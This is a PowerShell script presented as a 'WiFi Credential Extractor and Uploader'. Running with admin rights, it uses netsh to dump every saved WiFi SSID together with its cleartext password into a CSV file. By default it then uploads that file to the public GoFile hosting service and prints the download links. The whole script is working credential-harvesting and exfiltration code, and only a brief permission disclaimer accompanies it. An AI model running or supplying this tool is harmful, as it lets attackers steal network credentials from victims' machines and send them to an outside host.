<#

MIT License
Copyright (c) 2024 techiecyber404
See LICENSE file for full terms

.SYNOPSIS
    WiFi Credential Extractor and Uploader
.DESCRIPTION
    Extracts WiFi SSIDs and passwords from the local machine and optionally uploads them to GoFile.
    WARNING: Use only on networks you own or have permission to test.
.NOTES
    Author: Venkatesh.K
    Date: $(Get-Date -Format "yyyy-MM-dd")
    Version: 2.0
#>

# Requires admin rights
#Requires -RunAsAdministrator

param (
    [switch]$LocalOnly = $false,
    [string]$OutputPath = "$env:TEMP\wifi_passwords_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt",
    [switch]$ShowPasswords = $false
)

# Initialize
$ErrorActionPreference = "Stop"
$InformationPreference = "Continue"
$WarningPreference = "Continue"
$wifiInfo = @()

# Console colors
$successColor = "Green"
$warningColor = "Yellow"
$errorColor = "Red"
$infoColor = "Cyan"

function Write-Status {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )
    
    $color = switch ($Type) {
        "Success" { $successColor }
        "Warning" { $warningColor }
        "Error" { $errorColor }
        default { $infoColor }
    }
    
    Write-Host "[$($Type[0])] $Message" -ForegroundColor $color
}

try {
    Write-Status -Message "Starting WiFi credential extraction" -Type Info
    
    # Step 1: Extract Wi-Fi SSIDs and passwords
    Write-Status -Message "Gathering WiFi profiles..." -Type Info
    
    $profiles = (netsh wlan show profiles) | 
                Where-Object { $_ -match "All User Profile" } | 
                ForEach-Object { ($_ -split ":")[1].Trim() }

    if (-not $profiles) {
        Write-Status -Message "No WiFi profiles found" -Type Warning
        exit 1
    }

    foreach ($profile in $profiles) {
        try {
            $result = netsh wlan show profile name="$profile" key=clear
            $password = ($result | Select-String "Key Content") -replace ".*:\s+", ""
            
            if ($password) {
                $entry = [PSCustomObject]@{
                    SSID = $profile
                    Password = $password
                    Date = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                }
                $wifiInfo += $entry
                
                if ($ShowPasswords) {
                    Write-Status -Message "Found: $profile | Password: $password" -Type Success
                } else {
                    Write-Status -Message "Found credentials for: $profile" -Type Success
                }
            } else {
                Write-Status -Message "No password stored for: $profile" -Type Warning
            }
        } catch {
            Write-Status -Message "Error processing $profile : $_" -Type Error
        }
    }

    if (-not $wifiInfo) {
        Write-Status -Message "No passwords found in any profiles" -Type Error
        exit 1
    }

    # Step 2: Save to file
    try {
        $wifiInfo | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8 -Force
        Write-Status -Message "Saved credentials to: $OutputPath" -Type Info
        
        # Display summary
        Write-Host "`n=== Summary ===" -ForegroundColor Magenta
        $wifiInfo | Format-Table -AutoSize | Out-String -Width 4096 | Write-Host
        
        if (-not $ShowPasswords) {
            Write-Status -Message "Passwords are hidden (use -ShowPasswords to display)" -Type Warning
        }
    } catch {
        Write-Status -Message "Failed to save file: $_" -Type Error
        exit 1
    }

    if ($LocalOnly) {
        Write-Status -Message "Local only mode - skipping upload" -Type Info
        exit 0
    }

    # Step 3: Upload using HttpClient
    try {
        Write-Status -Message "Preparing upload to GoFile..." -Type Info
        
        Add-Type -AssemblyName System.Net.Http
        $client = New-Object System.Net.Http.HttpClient
        $client.DefaultRequestHeaders.UserAgent.ParseAdd("PowerShell WiFi Extractor")
        
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $fileStream = [System.IO.File]::OpenRead($OutputPath)
        
        try {
            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
            $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data")
            $fileContent.Headers.ContentDisposition.Name = "file"
            $fileContent.Headers.ContentDisposition.FileName = [System.IO.Path]::GetFileName($OutputPath)
            $content.Add($fileContent)

            # Step 4: POST to GoFile
            Write-Status -Message "Uploading to GoFile..." -Type Info
            $response = $client.PostAsync("https://store1.gofile.io/uploadFile", $content).Result
            
            if (-not $response.IsSuccessStatusCode) {
                Write-Status -Message "Upload failed with status: $($response.StatusCode)" -Type Error
                exit 1
            }

            $responseText = $response.Content.ReadAsStringAsync().Result

            # Step 5: Parse response
            try {
                $json = $responseText | ConvertFrom-Json
                if ($json.status -eq "ok") {
                    Write-Host "`n=== Upload Successful ===" -ForegroundColor Magenta
                    Write-Status -Message "Download page: $($json.data.downloadPage)" -Type Success
                    Write-Status -Message "Direct download: $($json.data.directLink)" -Type Success
                    Write-Status -Message "File will be available for: $($json.data.availabilityDuration)" -Type Info
                } else {
                    Write-Status -Message "Upload failed: $($json.status)" -Type Error
                }
            } catch {
                Write-Status -Message "Failed to parse upload response:`n$responseText" -Type Error
            }
        } finally {
            if ($fileStream) { $fileStream.Dispose() }
            if ($client) { $client.Dispose() }
        }
    } catch {
        Write-Status -Message "Upload error: $_" -Type Error
        exit 1
    }
} catch {
    Write-Status -Message "Critical error: $_" -Type Error
    exit 1
}